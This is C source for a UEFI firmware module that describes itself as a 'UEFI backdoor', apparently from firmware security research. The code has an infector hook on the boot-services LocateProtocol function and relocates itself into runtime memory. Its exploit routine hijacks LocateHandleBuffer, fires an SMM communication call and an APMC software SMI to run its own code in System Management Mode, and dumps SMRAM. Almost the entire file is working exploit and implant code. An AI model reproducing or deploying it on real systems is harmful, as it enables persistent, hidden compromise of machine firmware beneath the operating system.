#include <Protocol/LoadedImage.h>
#include <Protocol/DevicePath.h>
#include <Protocol/SerialIo.h>
#include <Protocol/SmmAccess2.h>
#include <Protocol/SmmBase2.h>
#include <Protocol/SmmCommunication.h>

#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DebugLib.h>
#include <Library/DevicePathLib.h>
#include <Library/UefiRuntimeLib.h>
#include <Library/SynchronizationLib.h>

#include <IndustryStandard/PeImage.h>

#include "../config.h"

#include "common.h"
#include "printf.h"
#include "serial.h"
#include "debug.h"
#include "loader.h"
#include "ovmf.h"
#include "DmaToSmm.h"
#include "asm/common_asm.h"

#pragma warning(disable: 4054)
#pragma warning(disable: 4055)
#pragma warning(disable: 4305)

#pragma section(".conf", read, write)

EFI_STATUS 
EFIAPI
_ModuleEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable
); 

EFI_STATUS
EFIAPI
BackdoorEntryInfected(
    EFI_GUID *Protocol, VOID *Registration, VOID **Interface
);

// PE image section with information for infector
__declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
{ 
    // address of LocateProtocol() hook handler
    (UINT64)&BackdoorEntryInfected,

    // address of original LocateProtocol() function
    0,

    // address of EFI_SYSTEM_TABLE
    0
};

PINFECTOR_STATUS m_InfectorStatus = (PINFECTOR_STATUS)(STATUS_ADDR);

VOID *m_ImageBase = NULL;
EFI_BOOT_SERVICES *m_BS = NULL;

// console I/O interface for debug messages
EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL; 

UINTN m_SmmHandlerExecuted = 0;

#define MAX_SMRAM_REGIONS 0x10

EFI_SMRAM_DESCRIPTOR m_SmramMap[MAX_SMRAM_REGIONS];
UINTN m_SmramMapSize = 0;
UINT64 m_SmramDump = 0;
//--------------------------------------------------------------------------------------
void ConsolePrint(char *Message)
{
    UINTN Len = strlen(Message), i = 0;

    if (m_TextOutput)
    {        
        for (i = 0; i < Len; i += 1)
        {    
            CHAR16 Char[2];        

            Char[0] = (CHAR16)Message[i];
            Char[1] = 0;

            m_TextOutput->OutputString(m_TextOutput, Char);
        }
    }   
}
//--------------------------------------------------------------------------------------
VOID *ImageBaseByAddress(VOID *Addr)
{
    UINTN Offset = 0;
    VOID *Base = (VOID *)ALIGN_DOWN((UINTN)Addr, DEFAULT_EDK_ALIGN);    

    // get current module base by address inside of it
    while (Offset < MAX_IMAGE_SIZE)
    {
        if (*(UINT16 *)Base == EFI_IMAGE_DOS_SIGNATURE ||
            *(UINT16 *)Base == EFI_TE_IMAGE_HEADER_SIGNATURE)
        {
            return Base;
        }

        Base = (VOID *)((UINT8 *)Base - DEFAULT_EDK_ALIGN);
        Offset += DEFAULT_EDK_ALIGN;
    }

    // unable to locate PE/TE header
    return NULL;
}
//--------------------------------------------------------------------------------------
VOID *BackdoorImageRealocate(VOID *Image)
{
    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        Image, 
        ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew
    );
    
    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
    EFI_PHYSICAL_ADDRESS Addr = 0;    

    // allocate memory for executable image
    EFI_STATUS Status = m_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        PagesCount,
        &Addr
    );
    if (Status == EFI_SUCCESS)
    {     
        VOID *Realocated = (VOID *)Addr;

        // copy image to the new location
        m_BS->CopyMem(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage); 

        // update image relocations acording to the new address
        LDR_UPDATE_RELOCS(Realocated, Image, Realocated);

        return Realocated;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
    }
 
    return NULL;
}
//--------------------------------------------------------------------------------------
#define EFI_EVENT_GROUP_DXE_DISPATCH_GUID \
  { 0x7081e22f, 0xcac6, 0x4053, { 0x94, 0x68, 0x67, 0x57, 0x82, 0xcf, 0x88, 0xe5 }}

#define BUFF_SIZE 0x200

EFI_LOCATE_HANDLE_BUFFER old_LocateHandleBuffer = NULL;

EFI_STATUS EFIAPI new_LocateHandleBuffer(
    EFI_LOCATE_SEARCH_TYPE SearchType, 
    EFI_GUID *Protocol, 
    VOID *SearchKey, 
    UINTN *NoHandles, 
    EFI_HANDLE **Buffer)
{
    UINTN i = 0, n = 0;

    m_SmmHandlerExecuted += 1;

    if (m_SmramDump != 0)
    {
        UINT8 *Buff = (UINT8 *)m_SmramDump;

        for (i = 0; i < m_SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
        {
            for (n = 0; n < m_SmramMap[i].PhysicalSize; n += 1)
            {
                *(Buff + n) = *(UINT8 *)(m_SmramMap[i].PhysicalStart + n);
            }

            Buff += m_SmramMap[i].PhysicalSize;
        }        
    }    

    return EFI_NOT_FOUND;
}

VOID FireSynchronousSmi(UINT8 Handler, UINT8 Data)
{
    // fire SMI using APMC I/O port
    __outbyte(0xb3, Data);
    __outbyte(0xb2, Handler);
}

EFI_STATUS Exploit(VOID)
{
    EFI_STATUS Status = 0;
    EFI_SMM_BASE2_PROTOCOL *SmmBase = NULL;    
    EFI_SMM_COMMUNICATION_PROTOCOL *SmmComm = NULL;

    UINTN DataSize = BUFF_SIZE;
    EFI_SMM_COMMUNICATE_HEADER *Data = NULL;
    EFI_GUID EfiEventDxeDispatchGuid = EFI_EVENT_GROUP_DXE_DISPATCH_GUID;

    m_SmmHandlerExecuted = 0;

    if ((Status = m_BS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, NULL, (VOID **)&SmmBase)) != EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%.8x\r\n", Status);   
        return Status;
    }

    if ((Status = m_BS->LocateProtocol(&gEfiSmmCommunicationProtocolGuid, NULL, (VOID **)&SmmComm)) != EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%.8x\r\n", Status);   
        return Status;
    }

    DbgMsg(__FILE__, __LINE__, "SMM communication protocol is at "FPTR"\r\n", SmmComm);    

    // allocate memory for SMM communication data
    if ((Status = m_BS->AllocatePool(0, DataSize, (VOID **)&Data)) != EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%.8x\r\n", Status);
        return Status;
    }

    DbgMsg(__FILE__, __LINE__, "Buffer for SMM communicate call is allocated at "FPTR"\r\n", Data);    
            
    // set up data header
    memcpy(&Data->HeaderGuid, &EfiEventDxeDispatchGuid, sizeof(EFI_GUID));                    
    Data->MessageLength = BUFF_SIZE;                

    old_LocateHandleBuffer = m_BS->LocateHandleBuffer;
    m_BS->LocateHandleBuffer = new_LocateHandleBuffer;

    // communicate with SmmRuntime driver callback
    Status = SmmComm->Communicate(SmmComm, Data, &DataSize);    

    if (m_SmmHandlerExecuted == 0)
    {
        // fire any synchronous SMI to process pending SMM calls and execute arbitrary code
        FireSynchronousSmi(0xFF, 0);
    }

    m_BS->LocateHandleBuffer = old_LocateHandleBuffer;
    
    DbgMsg(
        __FILE__, __LINE__, "Communicate(): status = 0x%.8x, size = 0x%.8x\r\n", 
        Status, DataSize
    );

    if (m_SmmHandlerExecuted > 0)
    {
        DbgMsg(__FILE__, __LINE__, "Exploitation success!\r\n");

        Status = EFI_SUCCESS;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Exploitation fails\r\n");
    }  

    return Status;
}
//--------------------------------------------------------------------------------------
typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(VOID *Image);

VOID BackdoorEntryResident(VOID *Image)
{
    EFI_STATUS Status = 0;
    EFI_SMM_ACCESS2_PROTOCOL *SmmAccess2 = NULL;    
    
    UINTN SmramSize = 0, i = 0;
    
    m_ImageBase = Image;        

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

    // locate SMM access 2 protocol
    if ((Status = m_BS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (VOID **)&SmmAccess2)) == EFI_SUCCESS)
    {        
        DbgMsg(__FILE__, __LINE__, "SMM access 2 protocol is at "FPTR"\r\n", SmmAccess2);
        DbgMsg(__FILE__, __LINE__, "Available SMRAM regions:\r\n");

        m_SmramMapSize = sizeof(m_SmramMap);

        // get SMRAM regions information
        if ((Status = SmmAccess2->GetCapabilities(SmmAccess2, &m_SmramMapSize, m_SmramMap)) == EFI_SUCCESS)
        {
            for (i = 0; i < m_SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
            {
                SmramSize += m_SmramMap[i].PhysicalSize;

                DbgMsg(
                    __FILE__, __LINE__, " * 0x%.8llx:0x%.8llx\r\n", 
                    m_SmramMap[i].PhysicalStart,
                    m_SmramMap[i].PhysicalStart + m_SmramMap[i].PhysicalSize - 1
                );
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "GetCapabilities() ERROR 0x%.8x\r\n", Status);

            m_SmramMapSize = 0;
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "Unable to locate SMM access 2 protocol: 0x%.8x\r\n", Status);
    }    

    if (SmramSize > 0)
    {
        EFI_PHYSICAL_ADDRESS PagesAddr;

        // allocate two 4Kb memory pages for backdoor info
        EFI_STATUS Status = m_BS->AllocatePages(
            AllocateAnyPages,
            EfiRuntimeServicesData,
            SmramSize / PAGE_SIZE, &PagesAddr
        );
        if (Status == EFI_SUCCESS)
        {     
            DbgMsg(
                __FILE__, __LINE__, 
                "%d bytes for SMRAM dump is allocated at "FPTR"\r\n",
                SmramSize, PagesAddr
            );

            m_SmramDump = (UINT64)PagesAddr;
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "AllocatePages() ERROR 0x%.8x\r\n", Status);
        }
    }

    m_InfectorStatus->Exploited += 1;

    if (Exploit() == EFI_SUCCESS)
    {        
        m_InfectorStatus->SmramDump = m_SmramDump;
    }
}
//--------------------------------------------------------------------------------------
EFI_STATUS
EFIAPI
BackdoorEntryInfected(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
{
    EFI_LOCATE_PROTOCOL LocateProtocol = NULL;
    EFI_SYSTEM_TABLE *SystemTable = NULL;

    // get backdoor image base address
    VOID *Base = ImageBaseByAddress(get_addr());
    if (Base == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  

    LocateProtocol = (EFI_LOCATE_PROTOCOL)m_InfectorConfig.LocateProtocol;
    SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;    

    // remove LocateProtocol() hook
    SystemTable->BootServices->LocateProtocol = LocateProtocol;

    // call real entry point
    _ModuleEntryPoint(NULL, SystemTable);    

    // call hooked function
    return LocateProtocol(Protocol, Registration, Interface);
}
//--------------------------------------------------------------------------------------
EFI_STATUS 
EFIAPI
_ModuleEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable) 
{
    EFI_STATUS Status = EFI_SUCCESS;    
    VOID *Image = NULL;

    m_BS = SystemTable->BootServices;

#if defined(BACKDOOR_DEBUG_SERIAL)

    // initialize serial port I/O for debug messages
    SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

#endif        

#if defined(BACKDOOR_DEBUG)

    // initialize console I/O
    Status = m_BS->HandleProtocol(
        SystemTable->ConsoleOutHandle,
        &gEfiSimpleTextOutProtocolGuid, 
        (VOID **)&m_TextOutput
    );
    if (Status == EFI_SUCCESS)
    {
        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
        m_TextOutput->ClearScreen(m_TextOutput);
    }

    DbgMsg(__FILE__, __LINE__, "******************************\r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "  UEFI backdoor loaded        \r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "******************************\r\n");

    DbgMsg(
        __FILE__, __LINE__, "Image address is "FPTR"\r\n", 
        m_ImageBase
    );

#endif // BACKDOOR_DEBUG    

    // copy image to the new location
    if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
    {
        BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
            Image,
            (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase
        );
        
        DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
        
        // initialize backdoor resident code
        pEntry(Image);
    } 

#if defined(BACKDOOR_DEBUG)

    m_BS->Stall(TO_MICROSECONDS(3));

#endif

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF

